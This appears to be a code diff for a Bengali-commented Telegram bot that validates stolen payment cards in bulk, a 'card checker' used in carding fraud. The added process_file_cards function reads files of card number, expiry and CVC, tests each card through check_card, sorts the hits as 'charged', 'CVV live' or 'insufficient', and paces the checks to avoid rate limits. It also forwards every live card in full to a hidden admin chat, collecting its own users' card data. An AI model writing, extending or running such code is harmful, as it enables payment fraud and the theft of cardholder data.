@@ -238,7 +238,258 @@ def check_card(card_num, card_mon, card_yer, card_cvc):
     except Exception as e:
         return f"ERROR: {str(e)}"
 
+# ============ ফাইল চেক ফাংশন (ফিক্সড) ============
+async def process_file_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path):
+    cards = []
+    try:
+        with open(file_path, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if line and '|' in line:
+                    parts = line.split('|')
+                    if len(parts) == 4:
+                        cards.append({
+                            'num': parts[0].strip(),
+                            'mon': parts[1].strip(),
+                            'yer': parts[2].strip(),
+                            'cvc': parts[3].strip()
+                        })
+    except Exception as e:
+        return None, str(e)
+    
+    if not cards:
+        return None, "No valid cards found!"
+    
+    total = len(cards)
+    live_cards = []
+    start_time = time.time()
+    
+    # ইনিশিয়াল প্রোগ্রেস মেসেজ
+    progress_text = f"""📁 FILE CHECK STARTED
+━━━━━━━━━━━━━━━━
+📊 Total Cards: {total}
+⏳ Progress: 0/{total} (0%)
+✅ Live Found: 0
+⏱️ Elapsed: 0s
+🕐 Remaining: Calculating...
+━━━━━━━━━━━━━━━━
+
+🔄 Initializing checker..."""
+    
+    progress_msg = await update.message.reply_text(progress_text)
+    
+    for i, card in enumerate(cards, 1):
+        yer = card['yer']
+        if len(yer) == 4:
+            yer = yer[2:]
+        
+        # কার্ড চেক করা
+        result = check_card(card['num'], card['mon'], yer, card['cvc'])
+        
+        elapsed = int(time.time() - start_time)
+        percent = int((i / total) * 100)
+        
+        # এভারেজ টাইম ক্যালকুলেশন
+        avg_time_per_card = elapsed / i if i > 0 else 0
+        remaining_cards = total - i
+        eta = int(avg_time_per_card * remaining_cards)
+        
+        # লাইভ কার্ড পাওয়া গেলে সাথে সাথে দেখানো
+        if result in ["LIVE_CHARGED", "LIVE_CVV", "LIVE_INSUFFICIENT"]:
+            live_cards.append({
+                'card': card,
+                'result': result,
+                'bin': get_bin_info(card['num'])
+            })
+            
+            live_status = "🔥 CHARGED" if result == "LIVE_CHARGED" else "⚡️ CVV LIVE" if result == "LIVE_CVV" else "💰 INSUFFICIENT"
+            bin_info = get_bin_info(card['num'])
+            
+            live_msg = f"""✅ LIVE CARD FOUND! #{len(live_cards)}
+
+💳 `{card['num']}|{card['mon']}|{yer}|{card['cvc']}`
+📊 Status: {live_status}
+🏦 {bin_info['brand']} - {bin_info['country']}
+━━━━━━━━━━━━━━━━"""
+            
+            await update.message.reply_text(live_msg, parse_mode='Markdown')
+        
+        # প্রোগ্রেস আপডেট (প্রতি কার্ডেই আপডেট করব)
+        progress_text = f"""📁 FILE CHECK IN PROGRESS
+━━━━━━━━━━━━━━━━
+📊 Total Cards: {total}
+⏳ Progress: {i}/{total} ({percent}%)
+✅ Live Found: {len(live_cards)}
+⏱️ Elapsed: {elapsed}s
+🕐 ETA: {eta}s
+━━━━━━━━━━━━━━━━
+
+🔄 Checking: `{card['num'][:4]}****{card['num'][-4:]}`
+📅 Card: {card['mon']}/{yer}
+━━━━━━━━━━━━━━━━
+
+⚡ Speed: ~{avg_time_per_card:.1f}s/card"""
+        
+        try:
+            await progress_msg.edit_text(progress_text, parse_mode='Markdown')
+        except:
+            pass
+        
+        # রেট লিমিট এড়ানোর জন্য সামান্য delay
+        await asyncio.sleep(1.5)
+    
+    # ফাইনাল রিপোর্ট
+    end_time = time.time()
+    total_time = int(end_time - start_time)
+    
+    # লাইভ কার্ডের বিস্তারিত লিস্ট
+    if live_cards:
+        live_list = "✅ LIVE CARDS FOUND\n━━━━━━━━━━━━━━━━\n"
+        for idx, lc in enumerate(live_cards, 1):
+            status_icon = "🔥" if lc['result'] == "LIVE_CHARGED" else "⚡️" if lc['result'] == "LIVE_CVV" else "💰"
+            live_list += f"{idx}. {status_icon} `{lc['card']['num']}|{lc['card']['mon']}|{lc['card']['yer']}|{lc['card']['cvc']}`\n"
+            live_list += f"   🏦 {lc['bin']['brand']} - {lc['bin']['country']}\n"
+    else:
+        live_list = "❌ No live cards found!\n━━━━━━━━━━━━━━━━"
+    
+    final_report = f"""📁 FILE CHECK COMPLETE
+━━━━━━━━━━━━━━━━
+📊 STATISTICS:
+• Total Cards: {total}
+• Live Cards: {len(live_cards)}
+• Dead Cards: {total - len(live_cards)}
+• Success Rate: {(len(live_cards)/total*100):.1f}%
+
+⏱️ TIME ANALYSIS:
+• Started: {time.strftime('%H:%M:%S', time.localtime(start_time))}
+• Ended: {time.strftime('%H:%M:%S', time.localtime(end_time))}
+• Duration: {total_time} seconds
+• Average: {total_time/total:.1f}s/card
+
+{live_list}
+━━━━━━━━━━━━━━━━
+💾 Report saved to admin"""
+    
+    # প্রোগ্রেস মেসেজ ডিলিট করে ফাইনাল রিপোর্ট পাঠান
+    await progress_msg.delete()
+    
+    if len(final_report) > 4000:
+        parts = [final_report[i:i+4000] for i in range(0, len(final_report), 4000)]
+        for part in parts:
+            await update.message.reply_text(part, parse_mode='Markdown')
+    else:
+        await update.message.reply_text(final_report, parse_mode='Markdown')
+    
+    # অ্যাডমিন রিপোর্ট
+    admin_report = f"""📁 FILE CHECK COMPLETE
+
+👤 User: {update.effective_user.first_name}
+🆔 ID: {update.effective_user.id}
+📊 Total: {total}
+✅ Live: {len(live_cards)}
+💀 Dead: {total - len(live_cards)}
+⏱️ Time: {total_time}s
+
+📋 Live Cards:
+"""
+    for lc in live_cards:
+        admin_report += f"\n{lc['card']['num']}|{lc['card']['mon']}|{lc['card']['yer']}|{lc['card']['cvc']}"
+    
+    if len(admin_report) > 4000:
+        admin_report = admin_report[:4000]
+    
+    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_report)
+    
+    return live_cards, None
+
 # ============ টেলিগ্রাম হ্যান্ডলার ============
+
+async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ Unauthorized!")
+        return
+    
+    users = load_users()
+    approved = load_approved()
+    pending = []
+    approved_list = []
+    
+    for uid, info in users.items():
+        uid_int = int(uid)
+        if uid_int in approved:
+            approved_list.append({'id': uid_int, 'name': info['name'], 'username': info['username']})
+        else:
+            pending.append({'id': uid_int, 'name': info['name'], 'username': info['username']})
+    
+    pending_text = "⏳ PENDING USERS\n━━━━━━━━━━━━━━━━\n"
+    if pending:
+        for p in pending:
+            pending_text += f"👤 {p['name']}\n🆔 <code>{p['id']}</code>\n📛 @{p['username']}\n"
+            pending_text += f"📋 <code>/approve {p['id']}</code>\n━━━━━━━━━━━━━━━━\n"
+    else:
+        pending_text += "No pending users\n━━━━━━━━━━━━━━━━\n"
+    
+    approved_text = "\n✅ APPROVED USERS\n━━━━━━━━━━━━━━━━\n"
+    if approved_list:
+        for a in approved_list:
+            approved_text += f"👤 {a['name']}\n🆔 <code>{a['id']}</code>\n📛 @{a['username']}\n"
+            approved_text += f"🗑️ <code>/remove {a['id']}</code>\n━━━━━━━━━━━━━━━━\n"
+    else:
+        approved_text += "No approved users\n━━━━━━━━━━━━━━━━\n"
+    
+    full_text = pending_text + approved_text
+    
+    keyboard = [
+        [InlineKeyboardButton("📋 COPY PENDING", callback_data='copy_pending')],
+        [InlineKeyboardButton("📋 COPY APPROVED", callback_data='copy_approved')],
+        [InlineKeyboardButton("🔄 REFRESH", callback_data='admin_panel')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(full_text, reply_markup=reply_markup, parse_mode='HTML')
+
+async def copy_pending(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    users = load_users()
+    approved = load_approved()
+    pending = []
+    
+    for uid, info in users.items():
+        uid_int = int(uid)
+        if uid_int not in approved:
+            pending.append(uid_int)
+    
+    if pending:
+        text = "📋 PENDING USER IDs:\n\n"
+        for uid in pending:
+            text += f"/approve {uid}\n"
+        
+        await query.message.reply_text(
+            f"<code>{text}</code>\n\n✅ Long press to copy",
+            parse_mode='HTML'
+        )
+    else:
+        await query.message.reply_text("No pending users!")
+
+async def copy_approved(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    approved = load_approved()
+    
+    if approved:
+        text = "📋 APPROVED USER IDs:\n\n"
+        for uid in approved:
+            text += f"/remove {uid}\n"
+        
+        await query.message.reply_text(
+            f"<code>{text}</code>\n\n✅ Long press to copy",
+            parse_mode='HTML'
+        )
+    else:
+        await query.message.reply_text("No approved users!")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -253,8 +504,20 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         }
         save_users(users)
         
-        admin_text = f"🆕 NEW USER REGISTERED!\n\n👤 Name: {user_name}\n🆔 ID: {user_id}\n📛 Username: @{update.effective_user.username}\n📅 Date: {users[str(user_id)]['date']}\n\n🔓 Approve: /approve {user_id}"
-        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text)
+        admin_text = f"""🆕 NEW USER REGISTERED!
+
+👤 Name: {user_name}
+🆔 ID: <code>{user_id}</code>
+📛 Username: @{update.effective_user.username}
+📅 Date: {users[str(user_id)]['date']}
+
+🔓 Approve Command:
+<code>/approve {user_id}</code>"""
+        
+        keyboard = [[InlineKeyboardButton("📋 COPY COMMAND", callback_data=f"copy_approve_{user_id}")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, reply_markup=reply_markup, parse_mode='HTML')
     
     approved_users = load_approved()
     
@@ -299,7 +562,15 @@ Welcome {user_name}!
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(welcome_text, reply_markup=reply_markup)
 
-# ফাইল চেক বাটন
+async def copy_approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    data = query.data
+    
+    if data.startswith("copy_approve_"):
+        user_id = data.replace("copy_approve_", "")
+        command = f"/approve {user_id}"
+        await query.answer(f"✅ Copied: {command}", show_alert=True)
+
 async def file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -319,149 +590,10 @@ async def file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Example:\n"
         "`4000000000000000|12|2026|123`\n"
         "`4111111111111111|01|2027|456`\n\n"
-        "⚠️ I will show progress and live results!"
+        "⚠️ Progress will be shown live!"
     )
     context.user_data['awaiting_file'] = True
 
-# ফাইল প্রসেসিং ফাংশন
-async def process_file_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path):
-    cards = []
-    try:
-        with open(file_path, 'r') as f:
-            for line in f:
-                line = line.strip()
-                if line and '|' in line:
-                    parts = line.split('|')
-                    if len(parts) == 4:
-                        cards.append({
-                            'num': parts[0].strip(),
-                            'mon': parts[1].strip(),
-                            'yer': parts[2].strip(),
-                            'cvc': parts[3].strip()
-                        })
-    except Exception as e:
-        return None, str(e)
-    
-    if not cards:
-        return None, "No valid cards found!"
-    
-    total = len(cards)
-    live_cards = []
-    checked = 0
-    
-    # প্রোগ্রেস মেসেজ
-    start_time = time.time()
-    progress_msg = await update.message.reply_text(
-        f"📁 FILE CHECK STARTED\n━━━━━━━━━━━━━━━━\n"
-        f"📊 Total Cards: {total}\n"
-        f"⏳ Progress: 0/{total} (0%)\n"
-        f"✅ Live Found: 0\n"
-        f"⏱️ Elapsed: 0s\n━━━━━━━━━━━━━━━━\n\n"
-        f"🔄 Checking cards..."
-    )
-    
-    for i, card in enumerate(cards, 1):
-        # Year format fix
-        yer = card['yer']
-        if len(yer) == 4:
-            yer = yer[2:]
-        
-        # কার্ড চেক
-        result = check_card(card['num'], card['mon'], yer, card['cvc'])
-        
-        elapsed = int(time.time() - start_time)
-        percent = int((i / total) * 100)
-        
-        # লাইভ কার্ড পাওয়া গেলে সাথে সাথে দেখানো
-        if result in ["LIVE_CHARGED", "LIVE_CVV", "LIVE_INSUFFICIENT"]:
-            live_cards.append({
-                'card': card,
-                'result': result,
-                'bin': get_bin_info(card['num'])
-            })
-            
-            # লাইভ কার্ডের ডিটেইলস মেসেজ
-            live_status = "🔥 CHARGED" if result == "LIVE_CHARGED" else "⚡️ CVV LIVE" if result == "LIVE_CVV" else "💰 INSUFFICIENT"
-            bin_info = get_bin_info(card['num'])
-            
-            live_msg = f"""✅ LIVE CARD FOUND! #{len(live_cards)}
-
-💳 {card['num']}|{card['mon']}|{yer}|{card['cvc']}
-📊 Status: {live_status}
-🏦 {bin_info['brand']} - {bin_info['country']}
-━━━━━━━━━━━━━━━━"""
-            
-            await update.message.reply_text(live_msg)
-        
-        # প্রতি 5 কার্ডে বা শেষে প্রোগ্রেস আপডেট
-        if i % 5 == 0 or i == total:
-            await progress_msg.edit_text(
-                f"📁 FILE CHECK IN PROGRESS\n━━━━━━━━━━━━━━━━\n"
-                f"📊 Total Cards: {total}\n"
-                f"⏳ Progress: {i}/{total} ({percent}%)\n"
-                f"✅ Live Found: {len(live_cards)}\n"
-                f"⏱️ Elapsed: {elapsed}s\n"
-                f"🕐 Est. Remaining: {int((elapsed/i)*(total-i))}s\n━━━━━━━━━━━━━━━━\n\n"
-                f"🔄 Checking: {card['num'][:4]}****{card['num'][-4:]}"
-            )
-        
-        # রেট লিমিট এড়ানোর জন্য ডিলে
-        await asyncio.sleep(2)
-    
-    # ফাইনাল রিপোর্ট
-    end_time = time.time()
-    total_time = int(end_time - start_time)
-    
-    # লাইভ কার্ডের লিস্ট
-    live_list = ""
-    for idx, lc in enumerate(live_cards, 1):
-        status_icon = "🔥" if lc['result'] == "LIVE_CHARGED" else "⚡️" if lc['result'] == "LIVE_CVV" else "💰"
-        live_list += f"{idx}. {status_icon} {lc['card']['num']}|{lc['card']['mon']}|{lc['card']['yer']}|{lc['card']['cvc']}\n"
-    
-    if not live_list:
-        live_list = "No live cards found!"
-    
-    final_report = f"""📁 FILE CHECK COMPLETE
-━━━━━━━━━━━━━━━━
-📊 STATISTICS:
-• Total Cards: {total}
-• Live Cards: {len(live_cards)}
-• Dead Cards: {total - len(live_cards)}
-• Success Rate: {(len(live_cards)/total*100):.1f}%
-
-⏱️ TIME TAKEN:
-• Started: {time.strftime('%H:%M:%S', time.localtime(start_time))}
-• Ended: {time.strftime('%H:%M:%S', time.localtime(end_time))}
-• Duration: {total_time} seconds
-
-✅ LIVE CARDS FOUND:
-{live_list}
-━━━━━━━━━━━━━━━━
-"""
-    
-    await progress_msg.delete()
-    
-    # রিপোর্ট太长 হলে ভাগ করে পাঠানো
-    if len(final_report) > 4000:
-        for i in range(0, len(final_report), 4000):
-            await update.message.reply_text(final_report[i:i+4000])
-    else:
-        await update.message.reply_text(final_report)
-    
-    # অ্যাডমিন রিপোর্ট
-    admin_report = f"""📁 FILE CHECK REPORT
-
-👤 User: {update.effective_user.first_name}
-🆔 ID: {update.effective_user.id}
-📊 Total: {total}
-✅ Live: {len(live_cards)}
-⏱️ Time: {total_time}s
-"""
-    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_report)
-    
-    return live_cards, None
-
-# ফাইল ডকুমেন্ট হ্যান্ডলার
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.user_data.get('awaiting_file'):
         return
@@ -480,23 +612,19 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Please send a .txt file!")
         return
     
-    # ফাইল ডাউনলোড
     status_msg = await update.message.reply_text("📥 Downloading file...")
     file = await context.bot.get_file(document.file_id)
     file_path = f"temp_{user_id}_{int(time.time())}.txt"
     await file.download_to_drive(file_path)
     await status_msg.delete()
     
-    # ফাইল প্রসেস
     await process_file_cards(update, context, file_path)
     
-    # ক্লিনআপ
     if os.path.exists(file_path):
         os.remove(file_path)
     
     context.user_data['awaiting_file'] = False
 
-# অন্যান্য হ্যান্ডলার (আগের মতো)
 async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized!")
@@ -556,16 +684,7 @@ async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Unauthorized!")
         return
     
-    users = load_users()
-    approved = load_approved()
-    
-    text = "📊 USERS LIST\n━━━━━━━━━━━━━━━━\n\n"
-    for uid, info in users.items():
-        uid_int = int(uid)
-        status = "✅" if uid_int in approved else "⏳"
-        text += f"{status} {info['name']}\n🆔 {uid}\n━━━━━━━━━━━━━━━━\n"
-    
-    await update.message.reply_text(text)
+    await admin_panel(update, context)
 
 async def check_card_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -581,7 +700,8 @@ async def check_card_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.message.reply_text(
         "🔍 SEND CARD\n\n"
         "Format: `number|month|year|cvv`\n"
-        "Example: `4000000000000000|12|2026|123`"
+        "Example: `4000000000000000|12|2026|123`",
+        parse_mode='Markdown'
     )
     context.user_data['awaiting_card'] = True
 
@@ -592,7 +712,8 @@ async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.message.reply_text(
         "🔍 BIN LOOKUP\n\n"
         "Send first 6 digits:\n"
-        "Example: `400000`"
+        "Example: `400000`",
+        parse_mode='Markdown'
     )
     context.user_data['awaiting_bin'] = True
 
@@ -671,7 +792,7 @@ async def handle_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
 {status}
 ━━━━━━━━━━━━━━━━
 
-💳 CARD: {card_num}|{card_mon}|{card_yer}|{card_cvc}
+💳 CARD: `{card_num}|{card_mon}|{card_yer}|{card_cvc}`
 
 🏦 BIN INFO:
 • BIN: {bin_info['bin']}
@@ -687,7 +808,7 @@ async def handle_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("📋 COPY", callback_data=f"copy_{card_num}|{card_mon}|{card_yer}|{card_cvc}")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await update.message.reply_text(result_text, reply_markup=reply_markup)
+    await update.message.reply_text(result_text, reply_markup=reply_markup, parse_mode='Markdown')
     
     admin_msg = f"🔔 Card Checked\n👤 {update.effective_user.first_name}\n💳 {card_num}|{card_mon}|{card_yer}|{card_cvc}\n📊 {status}"
     await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
@@ -755,6 +876,7 @@ def main():
     application.add_handler(CommandHandler("approve", approve_user))
     application.add_handler(CommandHandler("remove", remove_user))
     application.add_handler(CommandHandler("users", users_list))
+    application.add_handler(CommandHandler("admin", admin_panel))
     
     # কলব্যাক
     application.add_handler(CallbackQueryHandler(check_card_button, pattern='check_card'))
@@ -763,6 +885,10 @@ def main():
     application.add_handler(CallbackQueryHandler(my_info, pattern='my_info'))
     application.add_handler(CallbackQueryHandler(waiting, pattern='waiting'))
     application.add_handler(CallbackQueryHandler(copy_card, pattern='^copy_'))
+    application.add_handler(CallbackQueryHandler(copy_approve_command, pattern='^copy_approve_'))
+    application.add_handler(CallbackQueryHandler(copy_pending, pattern='copy_pending'))
+    application.add_handler(CallbackQueryHandler(copy_approved, pattern='copy_approved'))
+    application.add_handler(CallbackQueryHandler(admin_panel, pattern='admin_panel'))
     
     # মেসেজ
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card))
@@ -773,6 +899,7 @@ def main():
     
     print("🤖 BOT STARTED!")
     print(f"✅ Admin: {ADMIN_ID}")
+    print("📋 Admin Panel: /admin")
     
     application.run_polling()
 
